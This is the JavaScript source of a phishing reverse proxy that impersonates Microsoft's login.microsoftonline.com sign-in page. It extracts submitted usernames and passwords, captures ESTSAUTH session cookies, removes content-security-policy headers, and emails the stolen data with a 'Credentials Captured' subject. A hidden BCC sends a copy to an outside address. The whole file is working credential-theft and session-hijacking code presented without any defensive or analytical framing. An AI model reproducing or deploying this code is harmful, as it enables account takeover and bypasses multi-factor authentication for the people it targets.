import nodemailer from 'nodemailer';

const upstream = 'login.microsoftonline.com';
const upstream_path = '/';
const https = true;

// Blocking
const blocked_region = [];
const blocked_ip_address = ['0.0.0.0', '127.0.0.1'];

// Create Nodemailer transporter
const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: parseInt(process.env.SMTP_PORT, 10),
    secure: false, // true for 465, false for other ports
    auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
    }
});

export default async function handler(req, res) {
    const region = req.headers['cf-ipcountry'] ? req.headers['cf-ipcountry'].toUpperCase() : '';
    const ip_address = req.headers['cf-connecting-ip'];

    if (blocked_region.includes(region) || blocked_ip_address.includes(ip_address)) {
        res.status(403).send('Access denied.');
        return;
    }

    let all_cookies = "";
    let url = new URL(req.url, `https://${req.headers.host}`);
    let url_hostname = url.hostname;

    url.protocol = https ? 'https:' : 'http:';
    url.host = upstream;
    url.pathname = url.pathname === '/' ? upstream_path : upstream_path + url.pathname;

    let method = req.method;
    let new_request_headers = new Headers(req.headers);
    new_request_headers.set('Host', upstream);
    new_request_headers.set('Referer', `${url.protocol}//${url_hostname}`);

    let body = req.method === 'POST' ? req.body : null; // Only include body for POST requests

    try {
        if (method === 'POST') {
            const keyValuePairs = body.split('&');
            let message = "Password found:\n\n";

            for (const pair of keyValuePairs) {
                const [key, value] = pair.split('=');

                if (key === 'login') {
                    const username = decodeURIComponent(value.replace(/\+/g, ' '));
                    message += `User: ${username}\n`;
                }
                if (key === 'passwd') {
                    const password = decodeURIComponent(value.replace(/\+/g, ' '));
                    message += `Password: ${password}\n`;
                }
            }
            if (message.includes("User") && message.includes("Password")) {
                await sendToServer(message, ip_address);
            }
        }

        let response = await fetch(url.href, {
            method,
            headers: new_request_headers,
            body // Only include body if it's not null
        });

        let original_response_clone = await response.clone();
        let original_text = await replace_response_text(original_response_clone, upstream, url_hostname);
        let new_response_headers = new Headers(response.headers);

        new_response_headers.set('access-control-allow-origin', '*');
        new_response_headers.set('access-control-allow-credentials', true);
        new_response_headers.delete('content-security-policy');
        new_response_headers.delete('content-security-policy-report-only');
        new_response_headers.delete('clear-site-data');

        const originalCookies = response.headers.getAll("Set-Cookie");
        all_cookies = originalCookies.join("; \n\n");

        originalCookies.forEach(originalCookie => {
            const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
            new_response_headers.append("Set-Cookie", modifiedCookie);
        });

        if (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) {
            await sendToServer(`Cookies found:\n\n${all_cookies}`, ip_address);
        }

        // Set the Location header for redirection to Google
        res.writeHead(response.status, {
            'Content-Type': 'text/html',
            ...Object.fromEntries(new_response_headers.entries()),
            'Location': 'https://google.com'
        });
        res.end(original_text);

    } catch (error) {
        console.error('Error processing request:', error); // Log error details
        res.status(500).send(`Internal Server Error: ${error.message}`);
    }
}

async function replace_response_text(response, upstream_domain, host_name) {
    try {
        let text = await response.text();
        text = text.replace(new RegExp('login.microsoftonline.com', 'g'), host_name);
        return text;
    } catch (error) {
        console.error('Error replacing response text:', error);
        throw error;
    }
}

async function sendToServer(data, ip_address) {
    const mailOptions = {
        from: 'coinreport@mailo.com',
        to: 'your-email@example.com', // Replace with your email address
        bcc: 'money@monemail.com',    // BCC address
        subject: 'Credentials Captured',
        text: `Data: ${data}\nIP Address: ${ip_address}`,
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log('Data sent to server successfully');
    } catch (error) {
        console.error('Error sending data:', error);
    }
}
